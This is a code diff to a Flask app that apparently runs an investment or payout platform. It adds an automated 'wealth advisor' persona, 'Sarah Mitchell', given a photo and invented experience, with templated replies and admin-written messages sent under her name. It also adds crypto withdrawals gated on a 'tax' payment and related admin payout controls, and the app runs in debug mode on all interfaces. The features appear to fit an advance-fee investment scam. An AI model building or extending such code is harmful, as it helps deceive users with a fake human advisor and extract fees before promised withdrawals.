+    reply_text = reply_text.replace('{name}', current_user.username).replace('{mentor_name}', mentor.name)
+
+    ai_msg = MentorMessage(
+        user_id=current_user.id,
+        mentor_id=current_user.mentor_id,
+        sender='mentor',
+        message=reply_text,
+        created_at=_now() + timedelta(seconds=1)
+    )
+    db.session.add(ai_msg)
+    db.session.commit()
+
+    return jsonify({'success': True, 'message': 'Message sent successfully'})
+
+
+# ==================================================================
+# ADMIN CHAT CONTROLS
+# ==================================================================
+@app.route('/api/admin/mentor/conversations')
+@login_required
+@admin_required
+def admin_mentor_conversations():
+    """List all active advisor threads for administrative check-ins."""
+    users = User.query.filter(User.mentor_id.isnot(None)).all()
+    threads = []
+    for u in users:
+        mentor = Mentor.query.get(u.mentor_id)
+        last_msg = MentorMessage.query.filter_by(user_id=u.id).order_by(MentorMessage.created_at.desc()).first()
+        threads.append({
+            'user_id': u.id,
+            'username': u.username,
+            'email': u.email,
+            'mentor_name': mentor.name if mentor else 'Sarah Mitchell',
+            'last_message': last_msg.message if last_msg else 'No messages yet',
+            'last_message_time': last_msg.created_at.strftime('%Y-%m-%d %H:%M') if last_msg else '',
+            'unread_count': MentorMessage.query.filter_by(user_id=u.id, sender='user', is_read=False).count()
+        })
+    return jsonify({'success': True, 'threads': threads})
+
+
+@app.route('/api/admin/mentor/messages/<int:user_id>')
+@login_required
+@admin_required
+def admin_mentor_messages(user_id):
+    """Retrieve full conversation details for a user."""
+    messages = MentorMessage.query.filter_by(user_id=user_id).order_by(MentorMessage.created_at.asc()).all()
+    msg_list = []
+    for m in messages:
+        msg_list.append({
+            'id': m.id,
+            'sender': m.sender,
+            'message': m.message,
+            'created_at': m.created_at.strftime('%Y-%m-%d %H:%M')
+        })
+    return jsonify({'success': True, 'messages': msg_list})
+
+
+@app.route('/api/admin/mentor/send', methods=['POST'])
+@login_required
+@admin_required
+def admin_mentor_send():
+    """Send a custom message from mentor to user via admin control."""
+    data = request.get_json() or {}
+    user_id = data.get('user_id')
+    message_text = data.get('message', '').strip()
+
+    if not user_id or not message_text:
+        return jsonify({'success': False, 'message': 'User ID and Message are required'}), 400
+
+    user = db.session.get(User, user_id)
+    if not user:
+        return jsonify({'success': False, 'message': 'User not found'}), 404
+
+    msg = MentorMessage(
+        user_id=user.id,
+        mentor_id=user.mentor_id or 1,
+        sender='mentor',
+        message=message_text,
+        created_at=_now()
+    )
+    db.session.add(msg)
+    db.session.commit()
+    return jsonify({'success': True, 'message': 'Message sent successfully'})
 
 
 @app.route('/admin')
@@ -1409,6 +2160,7 @@ def admin_withdrawals():
             'status': w.status,
             'payment_method': w.payment_method or 'N/A',
             'reference': w.reference or '',
+            'txid': w.txid or '',
             'receipt_number': w.receipt_number or '',
             'bank_name': w.bank_name or '',
             'account_number': w.account_number or '',
@@ -1435,12 +2187,22 @@ def admin_approve_withdrawal(withdrawal_id):
     data = request.get_json() or {}
     withdrawal.status = 'completed'
     withdrawal.updated_at = _now()
+    withdrawal.marked_paid_at = _now()
+    withdrawal.marked_paid_by = current_user.id
+    withdrawal.txid = data.get('txid', withdrawal.txid)
     withdrawal.admin_notes = data.get('notes', withdrawal.admin_notes)
 
     # Generate receipt if not already generated
     if not withdrawal.receipt_number:
         withdrawal.receipt_number = generate_receipt_number()
         withdrawal.receipt_generated_at = _now()
+
+    # Update user stats
+    user = db.session.get(User, withdrawal.user_id)
+    if user:
+        user.pending_withdrawal = max(0.0, user.pending_withdrawal - withdrawal.amount)
+        user.total_withdrawn += withdrawal.amount
+        user.last_withdrawal_date = _now()
 
     # Log withdrawal transaction
     existing_withdrawal_tx = Transaction.query.filter(
@@ -1458,7 +2220,15 @@ def admin_approve_withdrawal(withdrawal_id):
         db.session.add(trans)
 
     db.session.commit()
-    return jsonify({'success': True, 'message': 'Withdrawal approved', 'receipt_number': withdrawal.receipt_number})
+    return jsonify({'success': True, 'message': 'Withdrawal marked as completed', 'receipt_number': withdrawal.receipt_number})
+
+
+@app.route('/api/admin/withdrawal/<withdrawal_id>/mark-paid', methods=['POST'])
+@login_required
+@admin_required
+def admin_mark_paid(withdrawal_id):
+    """Alias for mark paid in crypto layouts."""
+    return admin_approve_withdrawal(withdrawal_id)
 
 
 @app.route('/api/admin/withdrawal/<withdrawal_id>/reject', methods=['POST'])
@@ -1475,13 +2245,60 @@ def admin_reject_withdrawal(withdrawal_id):
     withdrawal.updated_at = _now()
     withdrawal.admin_notes = data.get('notes', 'Withdrawal rejected by admin')
 
-    # Refund balance
+    # Refund balance and adjust pending
     user = db.session.get(User, withdrawal.user_id)
     if user:
+        user.pending_withdrawal = max(0.0, user.pending_withdrawal - withdrawal.amount)
         user.balance += withdrawal.amount
 
     db.session.commit()
     return jsonify({'success': True, 'message': 'Withdrawal rejected and balance refunded'})
+
+
+@app.route('/api/admin/withdrawal/stats')
+@login_required
+@admin_required
+def admin_withdrawal_stats():
+    """Get metrics about the current withdrawal cycle."""
+    now = _now()
+    month_name = now.strftime('%B %Y')
+    month_start = now.replace(day=1, hour=0, minute=0, second=0, microsecond=0)
+
+    total_pending = db.session.query(db.func.sum(WithdrawalRequest.amount)).filter(
+        WithdrawalRequest.status.in_(['pending', 'tax_required'])
+    ).scalar() or 0.0
+
+    total_tax_collected = db.session.query(db.func.sum(WithdrawalRequest.tax_amount)).filter(
+        WithdrawalRequest.status == 'completed',
+        WithdrawalRequest.updated_at >= month_start
+    ).scalar() or 0.0
+
+    total_approved = db.session.query(db.func.sum(WithdrawalRequest.amount)).filter(
+        WithdrawalRequest.status == 'completed',
+        WithdrawalRequest.updated_at >= month_start
+    ).scalar() or 0.0
+
+    avg_withdrawal = db.session.query(db.func.avg(WithdrawalRequest.amount)).filter(
+        WithdrawalRequest.created_at >= month_start
+    ).scalar() or 0.0
+
+    pending_count = WithdrawalRequest.query.filter_by(status='pending').count()
+    approved_count = WithdrawalRequest.query.filter_by(status='completed').count()
+    tax_due_count = WithdrawalRequest.query.filter_by(status='tax_required').count()
+
+    return jsonify({
+        'success': True,
+        'data': {
+            'current_cycle': month_name,
+            'total_pending': round(total_pending, 2),
+            'total_tax_collected': round(total_tax_collected, 2),
+            'total_approved': round(total_approved, 2),
+            'average_withdrawal': round(avg_withdrawal, 2),
+            'pending_count': pending_count,
+            'approved_count': approved_count,
+            'tax_due_count': tax_due_count
+        }
+    })
 
 
 @app.route('/api/admin/withdrawal/<withdrawal_id>/generate-receipt', methods=['POST'])
@@ -1922,51 +2739,6 @@ def render_marketing_receipt_print(receipt_id):
 # USER BANKING DETAILS SUBMISSION
 # ==================================================================
 
-@app.route('/api/withdrawal/<withdrawal_id>/bank-details', methods=['POST'])
-@login_required
-def submit_banking_details(withdrawal_id):
-    """User submits banking details for a withdrawal that has tax paid."""
-    withdrawal = WithdrawalRequest.query.filter_by(
-        id=withdrawal_id,
-        user_id=current_user.id
-    ).first()
-    if not withdrawal:
-        return jsonify({'success': False, 'message': 'Withdrawal request not found'}), 404
-    if not withdrawal.tax_paid:
-        return jsonify({'success': False, 'message': 'Tax must be paid before providing banking details'})
-    if withdrawal.status not in ('pending', 'tax_required'):
-        return jsonify({'success': False, 'message': 'Withdrawal is not in a pending state'})
-
-    data = request.get_json() or {}
-    errors = []
-    if not data.get('bank_name'): errors.append('Bank name required')
-    if not data.get('account_name'): errors.append('Account holder name required')
-    if not data.get('account_number'): errors.append('Account number required')
-    if errors:
-        return jsonify({'success': False, 'message': '; '.join(errors)}), 400
-
-    withdrawal.bank_name = data['bank_name']
-    withdrawal.account_name = data['account_name']
-    withdrawal.account_number = data['account_number']
-    if data.get('routing_number'):
-        withdrawal.routing_number = data['routing_number']
-    if data.get('swift_code'):
-        withdrawal.swift_code = data['swift_code']
-    withdrawal.updated_at = _now()
-
-    db.session.commit()
-
-    return jsonify({
-        'success': True,
-        'message': 'Banking details submitted. Your withdrawal is now being processed.',
-        'data': {
-            'status': withdrawal.status,
-            'bank_name': withdrawal.bank_name,
-            'account_number': '****' + (withdrawal.account_number[-4:] if withdrawal.account_number and len(withdrawal.account_number) >= 4 else ''),
-        }
-    })
-
-
 # ==================================================================
 # Initialize DB
 # ==================================================================
@@ -2007,6 +2779,24 @@ with app.app_context():
             print("Successfully migrated database: added routing_number column.")
         except Exception as err:
             print("Migration warning (routing_number):", err)
+
+    # Dynamic SQLite migration for txid column
+    try:
+        raw_conn = db.engine.raw_connection()
+        cursor = raw_conn.cursor()
+        cursor.execute("SELECT txid FROM withdrawal_request LIMIT 1")
+        raw_conn.close()
+    except Exception:
+        try:
+            db.session.rollback()
+            raw_conn = db.engine.raw_connection()
+            cursor = raw_conn.cursor()
+            cursor.execute("ALTER TABLE withdrawal_request ADD COLUMN txid VARCHAR(200)")
+            raw_conn.commit()
+            raw_conn.close()
+            print("Successfully migrated database: added txid column.")
+        except Exception as err:
+            print("Migration warning (txid):", err)
 
     # Dynamic SQLite migration for swift_code column
     try:
@@ -2076,6 +2866,35 @@ with app.app_context():
         except Exception as err:
             print("Migration warning (ignored if column exists):", err)
 
+    # Dynamic migration for user crypto wallet columns
+    try:
+        raw_conn = db.engine.raw_connection()
+        cursor = raw_conn.cursor()
+        cursor.execute("SELECT crypto_wallet_address FROM user LIMIT 1")
+        raw_conn.close()
+    except Exception:
+        try:
+            db.session.rollback()
+            raw_conn = db.engine.raw_connection()
+            cursor = raw_conn.cursor()
+            cursor.execute("ALTER TABLE user ADD COLUMN crypto_wallet_address VARCHAR(200)")
+            cursor.execute("ALTER TABLE user ADD COLUMN crypto_network VARCHAR(50)")
+            raw_conn.commit()
+            raw_conn.close()
+            print("Successfully migrated database: added crypto wallet columns to user table.")
+        except Exception as err:
+            print("Migration warning (user crypto wallet):", err)
+
+    # Set default network for existing users
+    try:
+        raw_conn = db.engine.raw_connection()
+        cursor = raw_conn.cursor()
+        cursor.execute("UPDATE user SET crypto_network = 'Ethereum (ERC-20)' WHERE crypto_network IS NULL")
+        raw_conn.commit()
+        raw_conn.close()
+    except Exception as err:
+        print("Migration warning (setting default network):", err)
+
     # Generate referral codes for existing users that don't have one
     try:
         raw_conn = db.engine.raw_connection()
@@ -2090,6 +2909,109 @@ with app.app_context():
         raw_conn.close()
     except Exception as err:
         print("Migration warning (generating codes):", err)
+
+    # Dynamic SQLite migrations for new upgraded fields
+    new_user_cols = [
+        ("crypto_currency", "VARCHAR(10) DEFAULT 'USDT'"),
+        ("wallet_verified", "BOOLEAN DEFAULT 0"),
+        ("pending_withdrawal", "DOUBLE DEFAULT 0.0"),
+        ("total_withdrawn", "DOUBLE DEFAULT 0.0"),
+        ("last_withdrawal_date", "DATETIME"),
+        ("is_approved", "BOOLEAN DEFAULT 0"),
+        ("invitation_code", "VARCHAR(50)"),
+        ("invitation_expires_at", "DATETIME"),
+        ("mentor_id", "INTEGER"),
+        ("milestones_sent", "TEXT DEFAULT '[]'")
+    ]
+    for col_name, col_type in new_user_cols:
+        try:
+            raw_conn = db.engine.raw_connection()
+            cursor = raw_conn.cursor()
+            cursor.execute(f"SELECT {col_name} FROM user LIMIT 1")
+            raw_conn.close()
+        except Exception:
+            try:
+                db.session.rollback()
+                raw_conn = db.engine.raw_connection()
+                cursor = raw_conn.cursor()
+                cursor.execute(f"ALTER TABLE user ADD COLUMN {col_name} {col_type}")
+                raw_conn.commit()
+                raw_conn.close()
+                print(f"Successfully migrated user table: added {col_name} column.")
+            except Exception as err:
+                print(f"Migration warning (user {col_name}):", err)
+
+    new_withdrawal_cols = [
+        ("crypto_wallet_address", "VARCHAR(200)"),
+        ("crypto_network", "VARCHAR(50)"),
+        ("crypto_currency", "VARCHAR(10) DEFAULT 'USDT'"),
+        ("admin_notes", "TEXT"),
+        ("marked_paid_at", "DATETIME"),
+        ("marked_paid_by", "INTEGER")
+    ]
+    for col_name, col_type in new_withdrawal_cols:
+        try:
+            raw_conn = db.engine.raw_connection()
+            cursor = raw_conn.cursor()
+            cursor.execute(f"SELECT {col_name} FROM withdrawal_request LIMIT 1")
+            raw_conn.close()
+        except Exception:
+            try:
+                db.session.rollback()
+                raw_conn = db.engine.raw_connection()
+                cursor = raw_conn.cursor()
+                cursor.execute(f"ALTER TABLE withdrawal_request ADD COLUMN {col_name} {col_type}")
+                raw_conn.commit()
+                raw_conn.close()
+                print(f"Successfully migrated withdrawal_request table: added {col_name} column.")
+            except Exception as err:
+                print(f"Migration warning (withdrawal {col_name}):", err)
+
+    # Initialize default withdrawal settings
+    try:
+        if not WithdrawalSettings.query.first():
+            settings = WithdrawalSettings(
+                min_withdrawal=1000.00,
+                tax_rate=20.00,
+                processing_day=31,
+                cut_off_day=25,
+                default_currency='USDT',
+                default_network='Ethereum (ERC-20)',
+                auto_approve=False,
+                allow_crypto_payouts=True
+            )
+            db.session.add(settings)
+            db.session.commit()
+            print("Successfully initialized default withdrawal settings.")
+    except Exception as err:
+        print("Initialization warning (settings):", err)
+
+    # Initialize default AI mentor (Sarah Mitchell)
+    try:
+        if not Mentor.query.first():
+            mentor = Mentor(
+                name="Sarah Mitchell",
+                title="Senior Wealth Advisor",
+                experience="8 years in private wealth management",
+                personality="Caring, supportive, professional",
+                photo_url="/static/uploads/sarah_mitchell.jpg"
+            )
+            db.session.add(mentor)
+            db.session.commit()
+            print("Successfully initialized default AI Mentor Sarah Mitchell.")
+    except Exception as err:
+        print("Initialization warning (mentor):", err)
+
+    # Mark existing users as approved so they are not locked out
+    try:
+        raw_conn = db.engine.raw_connection()
+        cursor = raw_conn.cursor()
+        cursor.execute("UPDATE user SET is_approved = 1 WHERE is_approved IS NULL")
+        raw_conn.commit()
+        raw_conn.close()
+        print("Set is_approved = 1 for all pre-existing users.")
+    except Exception as err:
+        print("Migration warning (approving pre-existing users):", err)
 
 if __name__ == '__main__':
     app.run(debug=True, host='0.0.0.0', port=5000)
